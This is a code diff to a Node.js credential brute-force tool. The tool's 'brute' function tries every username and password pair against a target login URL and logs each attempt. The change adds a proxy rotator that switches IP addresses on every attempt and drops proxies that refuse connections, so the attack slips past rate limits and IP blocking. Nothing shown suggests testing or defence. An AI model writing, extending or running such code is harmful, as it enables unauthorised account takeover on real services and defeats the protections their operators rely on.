@@ -1,6 +1,6 @@
 const axios = require('axios');
 const chalk = require('chalk');
-const proxySupport = require('./proxy_support');
+const { ProxyRotator } = require('./proxy_rotator');
 const sessionLogger = require('./session_logger');
 
 async function brute(config, sessionLog) {
@@ -8,16 +8,19 @@ async function brute(config, sessionLog) {
     const results = [];
     let attempts = 0;
 
-    const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;
+    const proxyRotator = useProxy ? new ProxyRotator(config.proxies) : null;
+    let axiosInstance = axios;
 
     for (const username of usernames) {
         for (const password of passwords) {
             if (attempts >= maxAttempts) break;
-            const logEntry = await sessionLogger.log(config, {
+            if (useProxy) {
+                axiosInstance = await proxyRotator.createAxiosWithRotation(config, sessionLog);
+            }
+            sessionLog.push(await sessionLogger.log(config, {
                 operation: 'smart_brute_attempt',
                 details: `Testing ${username}:${password}`
-            });
-            sessionLog.push(logEntry);
+            }));
             try {
                 const response = await axiosInstance.post(targetUrl, { username, password }, { timeout: 5000 });
                 results.push({
@@ -45,6 +48,9 @@ async function brute(config, sessionLog) {
                     operation: 'smart_brute_error',
                     details: `Error: ${err.message}`
                 }));
+                if (useProxy && err.code === 'ECONNREFUSED') {
+                    proxyRotator.markProxyFailed(axiosInstance.defaults.proxy);
+                }
             }
             await new Promise(resolve => setTimeout(resolve, delayMs));
             attempts++;
